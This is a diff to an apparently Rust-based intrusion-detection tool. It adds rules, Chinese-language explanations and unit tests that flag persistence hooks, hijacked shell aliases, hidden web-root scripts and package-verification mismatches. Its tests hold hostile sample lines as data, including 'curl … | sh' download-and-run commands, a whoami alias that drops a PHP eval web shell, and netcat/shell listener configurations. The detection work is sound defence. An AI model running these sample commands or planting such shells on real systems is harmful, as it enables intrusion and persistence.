@@ -1149,6 +1149,239 @@ pub fn boot_event(line: &str) -> bool {
     mentions(line, &["system boot", "run-level", "runlevel", "shutdown"])
 }
 
+/// Commands attackers leave in shell and startup content to survive a reboot.
+/// Broader than `remote_execution_hint`: covers module loads, writable-area
+/// `nohup` payloads and inetd-style shell listeners.
+pub fn startup_hook(line: &str) -> bool {
+    let content = without_grep_prefix(line).trim();
+    if content.starts_with('#') {
+        return false;
+    }
+    if remote_execution_hint(line) {
+        return true;
+    }
+    let words: Vec<&str> = content.split_whitespace().collect();
+    if words
+        .iter()
+        .any(|word| matches!(*word, "insmod" | "modprobe" | "spawn" | "twist"))
+    {
+        return true;
+    }
+    if let Some(index) = words.iter().position(|word| *word == "nohup")
+        && let Some(program) = words.get(index + 1)
+    {
+        let program = program.trim_end_matches(['&', ';']);
+        if program.starts_with("/home/")
+            || program.starts_with("/root/")
+            || program.starts_with("/tmp/")
+            || program.starts_with("/var/tmp/")
+            || program.starts_with("/dev/shm/")
+            || program.contains("/.")
+        {
+            return true;
+        }
+    }
+    if let Some((key, value)) = content.split_once('=') {
+        let key = key.trim().to_ascii_lowercase();
+        let base = value
+            .trim()
+            .rsplit('/')
+            .next()
+            .unwrap_or("")
+            .to_ascii_lowercase();
+        if key == "server"
+            && (base.starts_with("python")
+                || matches!(
+                    base.as_str(),
+                    "bash"
+                        | "sh"
+                        | "dash"
+                        | "zsh"
+                        | "ksh"
+                        | "busybox"
+                        | "nc"
+                        | "ncat"
+                        | "socat"
+                        | "perl"
+                ))
+        {
+            return true;
+        }
+        if key == "server_args"
+            && value
+                .split_whitespace()
+                .any(|word| matches!(word, "-i" | "-e" | "-c"))
+        {
+            return true;
+        }
+    }
+    false
+}
+
+/// Sensitive command names an alias or function can silently wrap.
+const SENSITIVE_COMMANDS: [&str; 32] = [
+    "ls",
+    "ps",
+    "cd",
+    "sudo",
+    "su",
+    "ssh",
+    "scp",
+    "whoami",
+    "id",
+    "netstat",
+    "ss",
+    "top",
+    "htop",
+    "kill",
+    "cat",
+    "grep",
+    "find",
+    "passwd",
+    "w",
+    "who",
+    "last",
+    "lastb",
+    "crontab",
+    "systemctl",
+    "service",
+    "lsmod",
+    "rmmod",
+    "history",
+    "chattr",
+    "lsattr",
+    "userdel",
+    "useradd",
+];
+
+/// An alias or function that repoints a sensitive command, or a DEBUG/RETURN
+/// trap that fires on every command. Plain option aliases stay quiet.
+pub fn shell_hijack(line: &str) -> bool {
+    let content = without_grep_prefix(line).trim();
+    if content.starts_with('#') {
+        return false;
+    }
+    if remote_execution_hint(line) {
+        return true;
+    }
+    if let Some(rest) = content.strip_prefix("alias")
+        && let Some((name, value)) = rest.trim_start().split_once('=')
+        && SENSITIVE_COMMANDS.contains(&name.trim())
+    {
+        return [";", "&&", "||", "|", ">", "`", "$("]
+            .iter()
+            .any(|mark| value.contains(mark));
+    }
+    if let Some(rest) = content.strip_prefix("function") {
+        let name = rest
+            .trim_start()
+            .split(|ch: char| ch == '(' || ch.is_whitespace())
+            .next()
+            .unwrap_or("");
+        if SENSITIVE_COMMANDS.contains(&name) {
+            return true;
+        }
+    }
+    if let Some(paren) = content.find("()")
+        && SENSITIVE_COMMANDS.contains(&content[..paren].trim())
+    {
+        return true;
+    }
+    content.starts_with("trap")
+        && ["DEBUG", "RETURN", "ERR"]
+            .iter()
+            .any(|word| content.contains(word))
+}
+
+/// Hidden files inside site roots. `.htaccess` and `.user.ini` are normal;
+/// a hidden script or planted file is not.
+pub fn hidden_entry(line: &str) -> bool {
+    if planted_file(line) {
+        return true;
+    }
+    const SCRIPT_EXTENSIONS: [&str; 17] = [
+        ".php", ".php3", ".php4", ".php5", ".php6", ".php7", ".php8", ".phtml", ".phar", ".jsp",
+        ".jspx", ".asp", ".aspx", ".ashx", ".cgi", ".pl", ".py",
+    ];
+    if !["/var/www/", "/usr/share/nginx/", "/srv/www/"]
+        .iter()
+        .any(|root| line.contains(root))
+    {
+        return false;
+    }
+    let name = line
+        .split_whitespace()
+        .last()
+        .unwrap_or("")
+        .rsplit('/')
+        .next()
+        .unwrap_or("");
+    name.starts_with('.')
+        && !matches!(name, ".htaccess" | ".user.ini")
+        && (name.ends_with(".sh") || SCRIPT_EXTENSIONS.iter().any(|ext| name.ends_with(ext)))
+}
+
+/// Kernel module anomaly: a tainted kernel or a fixed 关注 line from the
+/// /sys/module vs /proc/modules and kallsyms comparisons.
+pub fn module_anomaly(line: &str) -> bool {
+    tainted_kernel(line) || line.contains("关注：")
+}
+
+/// A `.pth` line that auto-imports dangerous modules on every interpreter
+/// start. setuptools' own `distutils-precedence.pth` and `*-nspkg.pth`
+/// namespace lines are known boilerplate.
+pub fn pth_autoimport(line: &str) -> bool {
+    let content = without_grep_prefix(line).trim();
+    if !content.starts_with("import") {
+        return false;
+    }
+    if content.contains("distutils-precedence") || content.contains("_distutils_hack") {
+        return false;
+    }
+    [
+        "os",
+        "subprocess",
+        "socket",
+        "pty",
+        "base64",
+        "exec",
+        "eval",
+        "urllib",
+        "requests",
+        "marshal",
+        "codecs",
+    ]
+    .iter()
+    .any(|name| content.contains(name))
+}
+
+/// A package verification mismatch line or a fixed warning the command emits:
+/// rpm/dpkg flag columns, `debsums -c` bare changed paths, `apk audit`
+/// changed-added-deleted prefixes, `missing` records and the 关注 line.
+pub fn package_verify_mismatch(line: &str) -> bool {
+    if line.contains("关注：") || line.starts_with("missing") {
+        return true;
+    }
+    if matches!(line.chars().next(), Some('A' | 'U' | 'D' | 'X'))
+        && line[1..].starts_with(' ')
+        && line[2..].starts_with('/')
+    {
+        return true;
+    }
+    let flags = line.split_whitespace().next().unwrap_or("");
+    if flags.len() == 9
+        && flags.contains('5')
+        && flags
+            .chars()
+            .all(|ch| ch == '?' || ch == '.' || ch.is_ascii_alphanumeric())
+        && (flags.contains('.') || flags.contains('?'))
+    {
+        return true;
+    }
+    // debsums -c prints a bare absolute path for each changed file.
+    !line.contains(' ') && line.starts_with('/') && !line.ends_with('/')
+}
+
 /// Why a rule marks a line, in the operator's words. Every rule the catalog
 /// uses has an entry; the table is checked against the catalog by test.
 static REASONS: &[(LineRule, &str)] = &[
@@ -1343,6 +1576,30 @@ static REASONS: &[(LineRule, &str)] = &[
     (
         remote_execution_hint as LineRule,
         "标记的条目带下载执行特征、引用可写目录，或通过提示命令记录会话。需核对来源与用途，维护脚本也可能命中，不能直接判定为植入。",
+    ),
+    (
+        startup_hook as LineRule,
+        "标记的启动内容带远程执行特征、加载内核模块、从可写目录后台运行程序，或注册提供 shell/解释器的网络服务。正常维护脚本也可能命中，需核对来源与用途。",
+    ),
+    (
+        shell_hijack as LineRule,
+        "标记的别名或函数会劫持常用命令（拼接额外命令、覆盖同名函数或注册执行陷阱）。请核对该行定义与实际行为，普通选项别名不标记。",
+    ),
+    (
+        hidden_entry as LineRule,
+        "标记的是可写位置的隐藏文件，或站点目录内的隐藏脚本文件。请核对来源与用途；.htaccess、.user.ini 等常规文件不标记。",
+    ),
+    (
+        module_anomaly as LineRule,
+        "标记的是内核污点计数，或在 /sys/module、内核符号表中出现但模块列表中不可见的疑似自隐藏模块。请结合启动记录与完整性校验核实。",
+    ),
+    (
+        pth_autoimport as LineRule,
+        "标记的自动导入文件会在每次启动解释器时执行网络、执行或解码相关模块导入；setuptools 自带样板不标记。请核对文件来源与用途。",
+    ),
+    (
+        package_verify_mismatch as LineRule,
+        "标记的是软件包校验不一致的行、提示校验工具不可信的行，或记录中缺失文件的行。需结合升级记录和文件来源核实。",
     ),
     (
         tampered_or_telling_history as LineRule,
@@ -2014,5 +2271,118 @@ mod tests {
         let marks = finding_lines(&output, Some(suid_program));
         assert_eq!(marks.len(), MAX_FINDING_LINES);
         assert!(marks.windows(2).all(|pair| pair[0] < pair[1]));
+    }
+
+    #[test]
+    fn startup_hook_covers_module_nohup_and_xinetd_shapes() {
+        for hit in [
+            "insmod /tmp/rootkit.ko",
+            "modprobe evilmod",
+            "nohup /tmp/.hidden/payload &",
+            "nohup /dev/shm/beacon",
+            "server = /bin/bash",
+            "server=/usr/bin/ncat",
+            "server = /usr/bin/python3.11",
+            "server_args = -i",
+            "server_args=-e /tmp/x",
+            "/etc/rc.local:12:nohup /var/tmp/agent &",
+            "curl http://x/x.sh | sh",
+            "ALL: ALL: spawn /tmp/.x/run",
+            "ALL: ALL: twist /bin/sh",
+        ] {
+            assert!(startup_hook(hit), "{hit}");
+        }
+        for quiet in [
+            "nohup /usr/sbin/keepalived &",
+            "# insmod /tmp/rootkit.ko",
+            "server = /usr/sbin/in.telnetd",
+            "server_args = --config /etc/x.conf",
+            "install newmod",
+            "modprobe.d/blacklist.conf",
+        ] {
+            assert!(!startup_hook(quiet), "{quiet}");
+        }
+    }
+
+    #[test]
+    fn shell_hijack_covers_alias_function_and_trap() {
+        let writeup = "alias whoami='whoami;echo \"<?php @eval($_POST[1]);?>\" > /var/www/html/.dont_delete_me.php'";
+        for hit in [
+            writeup,
+            "alias sudo='sudo; /tmp/collect &'",
+            "alias grep='grep | /tmp/.x/x'",
+            "function cd { builtin cd \"$@\" && /tmp/x; }",
+            "whoami() { /tmp/fake; }",
+            "ls() { /tmp/fake; }",
+            "trap 'echo x' DEBUG",
+            "trap cleanup RETURN",
+            "curl http://x/a.sh | bash",
+        ] {
+            assert!(shell_hijack(hit), "{hit}");
+        }
+        for quiet in [
+            "alias ll='ls -alF'",
+            "alias ls='ls --color=auto'",
+            "alias rm='rm -i'",
+            "alias grep='grep --color=auto'",
+            "# alias sudo='sudo; /tmp/x'",
+            "trap -p",
+            "myhelper() { :; }",
+        ] {
+            assert!(!shell_hijack(quiet), "{quiet}");
+        }
+    }
+
+    #[test]
+    fn hidden_entry_covers_web_root_scripts_and_stays_quiet_on_dotfiles() {
+        assert!(hidden_entry(
+            "-rw-r--r-- 1 www www 33 Feb  1 10:00 /var/www/html/.dont_delete_me.php"
+        ));
+        assert!(hidden_entry(
+            "-rw-r--r-- 1 www www 33 Feb  1 10:00 /srv/www/site/.x.jsp"
+        ));
+        assert!(hidden_entry("/tmp/.hidden/bash"));
+        assert!(!hidden_entry(
+            "-rw-r--r-- 1 www www 33 Feb  1 10:00 /var/www/html/.htaccess"
+        ));
+        assert!(!hidden_entry(
+            "-rw-r--r-- 1 www www 33 Feb  1 10:00 /var/www/html/.user.ini"
+        ));
+        assert!(!hidden_entry(
+            "-rw-r--r-- 1 u g 33 Feb  1 10:00 /etc/nginx/.keep"
+        ));
+    }
+
+    #[test]
+    fn package_verify_mismatch_flags_mismatch_missing_and_warning_lines() {
+        for hit in [
+            "??5??????  c  /etc/app.conf",
+            "S.5....T.  c  /etc/app.conf",
+            "missing     /usr/bin/tool",
+            "关注：dpkg 程序与安装记录不一致，校验结果不可信（md5sum 自身未校验）",
+        ] {
+            assert!(package_verify_mismatch(hit), "{hit}");
+        }
+        for hit in [
+            "/usr/bin/ls",
+            "A /etc/apk/world",
+            "U /bin/busybox",
+            "D /usr/sbin/sshd",
+            "X /etc/ssl/cert.pem",
+        ] {
+            assert!(package_verify_mismatch(hit), "{hit}");
+        }
+        for quiet in [
+            "debsums 未安装",
+            "debsums 与 dpkg 不可用",
+            "完整性校验工具不可用",
+            "关键软件包均未安装",
+            "# 仅校验关键软件包；完整校验需单独执行 dpkg --verify",
+            "..........  c  /etc/app.conf",
+            "normal line",
+            "/var/log/messages rotated",
+        ] {
+            assert!(!package_verify_mismatch(quiet), "{quiet}");
+        }
     }
 }
